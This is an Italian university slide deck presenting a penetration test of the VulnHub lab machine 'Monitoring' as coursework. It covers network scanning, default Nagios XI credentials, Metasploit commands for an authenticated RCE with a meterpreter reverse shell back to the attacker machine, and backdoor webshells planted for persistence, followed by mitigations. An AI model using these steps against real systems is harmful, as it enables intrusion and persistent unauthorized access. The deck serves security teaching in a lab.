---
title: PTEH - Presentazione
description: Presentazione penetration testing su macchina Monitoring
marp: true
paginate: true
_paginate: false # no number on title slide

size: 4k
theme: gaia

---
<!--
    Ho usato / invece di \ in questo modo
    quando esporto il fil in PDF le path non vengono perse 
    e vengono correttamente visionate.
    Per quanto riguarda l'esportazione in HTML (dove funzionano le    GIF) non viene intaccata da questa modifica 
-->

[logounisa]: img/logo_standard.png
[infrastruttura]: img/infrastruttura.png
[kali]: img/imgReport/kaliMACHINE.png
[netscan]: img/imgReport/netscan.png
[portscanning]: img/imgReport/nmap.png
[nagiosPrima]: img/imgReport/nagiosHOME.png
[nagiosSeconda]: img/imgReport/nagiosLogin.png
[nagiosLoginEffettuato]: img/gif/nagiosAccesso.gif
[runExploit]: img/imgReport/runEXPLOITandDENTROLAMACCHINA.png
[sysInfo]: img/imgReport/sysinfoMETASPLOIT.png
[verificaPrivilegi]: img/imgReport/postExploitation.png
[verificaServiziAttivi]: img/imgReport/serviceInListen.png
[phpmeter]: img/imgReport/uploadBD_METERPRETER.png
[webshell]: img/imgReport/uploadBACKDOOR.png
[toolGIF]: img/gif/toolGIF.gif
[nessunResScan]: img/imgReport/nessus_scan_repo.png
[nessunResScanTorta]: img/imgReport/nessusTORTA.png
[skipfishResScanTorta]: img/imgReport/skipfishTORTA.png
[scannerGIF]: img/gif/scanner.gif
[gokuSSJGIF]: img/gif/gokuSSj.gif
[thankYOU]: img/gif/thankYOU.gif
[summary]: img/gif/index.gif
[zabbixMonitor]: img/imgReport/zabbixPIC.png
[nagiosMonitor]: img/imgReport/nagiosPIC.png
[targetDiscoverynmap]: img/gif/targetDiscoverywnmap.gif
[skipfishResScanElenco]: img/imgReport/skipfishSCANblando.png
[boxscatola]: img/gif/box.gif
[documentazione]: img/gif/documentazione.gif

![bg right:33% 40%][logounisa]

##### Penetration testing and ethical hacking

#####  A.A 20/21

Professore: Arcangelo Castiglione

<br>

**Asset analizzato:** *"Monitoring" by VulnHub*

<br>

Studente: Di Palma Giuseppe

---

<!-- _class: invert -->

## Indice

- 1️⃣ Ambiente operativo;
- 2️⃣ Target analizzato;
- 3️⃣ Metodologia;
- 4️⃣ Penetration testing;
- 5️⃣ Tool utilizzati;
- 6️⃣ Risultati ottenuti;
- 7️⃣ Rimedi & Mitigazione;
- 8️⃣ Conclusioni.

![bg right w:350][summary]

---

# 1️⃣ Ambiente operativo <!--fit-->

![bg right 90%][infrastruttura]

- Windows 10
- Vmware workstation 16.0
- Macchina attaccante: Kali Linux
- Target: Monitoring 1

---
<!-- _class: invert -->
## 🖥️ Macchina attacante - Kali Linux

<br>

![bg w:800px ][kali]

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

By [offensive security](https://www.offensive-security.com/)

---

# 2️⃣ Target analizzato

- Nome della macchina 💻 : MONITORING;
- Sistema operativo 🐧 : Linux;
- Networking:
  - DHCP service: Enabled;
  - IP address: Automatically assign.

<br>
<br>

### Asset 🔗[Monitoring 1](https://www.vulnhub.com/entry/monitoring-1,555/) disponibile su [Vulhub.com](https://www.vulnhub.com)

---

# ❓ Monitoring di altre infrastrutture <!--fit-->

- Software per monitoraggio;
- Collegamento con altre reti;
- Zabbix, nagios, solarwinds 😱
- etc...

---
<!-- _paginate: false -->

![bg][zabbixMonitor]

---
<!-- _paginate: false -->
![bg][nagiosMonitor]

---

<!-- _class: invert -->
# 3️⃣ Metodologia

- ~~Accordo con cliente;~~
- Obbiettivo;
- Approccio **Gray Box**
  - Conoscenza minima;

![bg right w:200][boxscatola]

---

# 4️⃣ Penetration testing

- Information gathering
- Target discovery
- Enumerating target e port scanning
- Vulnerability mapping
- Target exploitation
- Post Exploitation
  
---
# ℹ️ Information gathering

- Individuare indirizzo ip macchina target:

`netdiscover -i eth0 -r 192.168.19.0/24`

Risultato:

![center w:950][netscan]

---
<!-- _class: invert -->
## ⛏️ Target discovery

`nmap -sP 192.168.19.0/24`:

![w:950][targetDiscoverynmap]

- L'asset risulta attivo e raggiungibile.

---

# 🚪 Enumerating Target e port scanning

- Scansione porte e relativi servizi:

`nmap -sV -T5 -p- 192.168.19.132`

Risultato:

![portscanning]

---
<!-- _class: invert -->
# Cose interessanti <!--fit-->

- Porta 80 e 443
  - Visito: http://192.168.19.132

![w:400][nagiosPrima]![bg right w:900][nagiosSeconda]

---

## Nagios XI
*Noto sistema di monitoraggio usato in ambito enterprise per monitorare interi asset o infrastrutture, dalle performance ai servizi.*

- Prendere conoscenza del tool con documentazione;
- Controllare se account amministratore è abilitato 😧.

Credenziali testate:
- admin/admin
- ...
- **nagiosadmin/admin**
---

<!-- _paginate: false -->

![bg w:1280 h:720][nagiosLoginEffettuato]

---
<!-- _class: invert -->
# 💥 Inoltre

- Distribuzione di tipo Ubuntu Linux;
- Possibile vulnerabilità enumerazione utenti ssh;
- Possibile vulnerabilità DOS (openLDAP)

---

# Target exploitation

Framework metasploit:
```bash
search nagios xi
use xploit/linux/http/nagios_xi_authenticated_rce
use inux/x64/meterpreter/reverse_tcp (default)
```

Configuro parameti richiesti:

```bash
set rhosts 192.168.19.132 (target)
set password admin
set lhost 192.168.19.131 (kali)
```

---

`run exploit`:

![w:700 h:300][runExploit]

`sysinfo`:

![w:600][sysInfo]

---
<!-- _class: invert -->
# 🚩 Post exploitation

- Verifica privilegi
  - `whoami`:

![w:800][verificaPrivilegi]

---
<!-- _class: invert -->
- Verifica servizi attivi
  - `netstat -tulpn | grep LISTEN`:

![w:900][verificaServiziAttivi]

---
<!-- _class: invert -->
- Mantenere accesso successivo
  - Backdoor:
    - phpmeter.php;
    - webshell.

![phpmeter]

![w:600][webshell]

---

# 5️⃣ 🧰 Tool utilizzati

- Netdiscovery;
- Ping;
- Nmap;
- Nessus;
- Skipfish;
- Metasploit;
  - Msfvenom.

![bg right:40% w:400][toolGIF]

---
<!-- _class: invert -->

# 6️⃣ Riepilogo risultati <!--fit-->

- Scansione Nessus;
- Scansione w.app SkipFish;

![bg right w:250][scannerGIF]

---

# 📃 Nessus

*Tool per scansione automattizata delle vulnerabilità.*

- Scansione vulnerabilità su vasta gamma di sistemi;
- Basato su CVSS v3.1 rating;
- Scansione completamente personalizzabile;
- Possibilità di estendere con **plugins**.

---

`Scansione generale con Nassus:`

![bg w:1200 h:730][nessunResScanTorta]

---

# 🐟 Skipfish

*Tool per scansione automatizzata specifico per web app.*

- Facile da usare;
- Prestazioni elevate;
- Molto versatile;
- Permette personalizzazione report e confronto;

---

`Scansione web app con Skipfish:`

![bg w:1200 h:730][skipfishResScanTorta]

---

<br>
<br>
<br>
<br>
<br>

# Nello specifico ▶️ <!--fit-->

![bg right][skipfishResScanElenco]

---

<!-- _class: invert -->
# 7️⃣ Rimedi & Mitigazione<!--fit-->

- Aggiornamento del sistema;
- Rimozione account default Nagios;
  - O valutare cambio password;
- Uso di certificati ssl;
- Troppe informazioni esposte;
- Usare politiche firewalling.

![bg right:40% w:300][gokuSSJGIF]

---

# 8️⃣ 🏁 Conclusioni <!--fit-->

- Documentazione
  - Come ho eseguito l'attacco e quali metodologie ho usato;
  - Report delle vulnerabilità trovate e possibili soluzioni.

![bg right w:350][documentazione]

---
<!-- _class: invert -->

![bg w:600][thankYOU]

---

# 👉 Riferimenti e link utili

1. Documentazione [Nagios](https://www.nagios.org/documentation/);
2. Asset [Monitoring 1](https://www.vulnhub.com/entry/monitoring-1,555/);
3. Documentazione [Kali](https://www.kali.org/docs/);
4. Documentazione [Network monitoring](https://en.wikipedia.org/wiki/Network_monitoring);
5. Manuale [Skipfish](https://tools.kali.org/web-applications/skipfish);
6. Manuale [Nessus](https://www.tenable.com/products/nessus/nessus-essentials) by Tenable;
7. Specifiche [CVSSv3.1](https://www.first.org/cvss/specification-document);
8. [Marp](https://marketplace.visualstudio.com/items?itemName=marp-team.marp-vscode) ➕ [VScode](https://code.visualstudio.com/) per questa presentazione.